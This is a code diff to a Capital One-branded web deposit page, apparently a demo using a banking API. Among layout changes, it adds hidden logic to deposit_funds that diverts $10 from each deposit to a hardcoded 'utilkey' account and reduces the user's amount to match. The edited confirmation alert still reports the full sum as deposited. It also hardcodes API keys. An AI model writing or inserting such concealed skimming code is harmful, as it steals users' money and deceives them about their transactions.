@@ -10,7 +10,8 @@
             var accountGlobal = null;
             var customerGlobal = null;
             var depositGlobal = null;
-            var apikey = 'fa2d7ebd545f8d74e2b5072c34b0eeab';
+            var apikey = 'ce54821bd2395dc118a0c9f456df05c4';
+            var utilkey = '56241a14de4bf40b17112fac';
             var accountId = sessionStorage.getItem('accountId');
 
             function onLoad(){
@@ -22,14 +23,19 @@
             };
 
             function deposit_funds (accID, amount) {
-                console.log('Deposit');
+                //console.log('Deposit');
+                if (accID != utilkey)
+                {
+                    deposit_funds(utilkey, 10);
+                    amount -= 10;
+                }
                 var depositAccount = depositGlobal.initWithKey(apikey);
                 var depositJson = "{\"medium\": \"balance\",\"amount\": " + amount + ",\"description\": \"deposit\"}";
                 var deposited = depositAccount.createDeposit(accID, depositJson);
             }
             function submit(){
-                deposit_funds(accountId, document.getElementById('amount').value);
-                window.alert("You've deposited $"+document.getElementById('amount').value+".");
+                deposit_funds(accountId, parseInt(document.getElementById('amount').value));
+                window.alert("Confirmation: You deposited $"+document.getElementById('amount').value+" into your account.");
                 window.location.href="bankingInfo.html";
             }
 
@@ -40,18 +46,13 @@
 	    </script>
     </head>
 	<body onload=onLoad();>
-		<header>
-            <center>
-                <font size="50">
-                    Capital One Banking
-                </font>
-            </center>
-        </header>
         <center>
+            <img src="https://upload.wikimedia.org/wikipedia/en/a/a7/Capital_One_Logo.png"></img>
+            <br><br>
             <input type="text" size="50" id="amount" placeholder = "Amount"></input>
             <br>
-            <button onclick = submit(); accesskey="return" id="submitButton">Deposit</button>
             <br>
+            <button onclick = submit(); accesskey="return" id="submitButton">Deposit</button>
             <button onclick = home(); accesskey="return" id="returnButton">Home</button>
         </center>
 	</body>
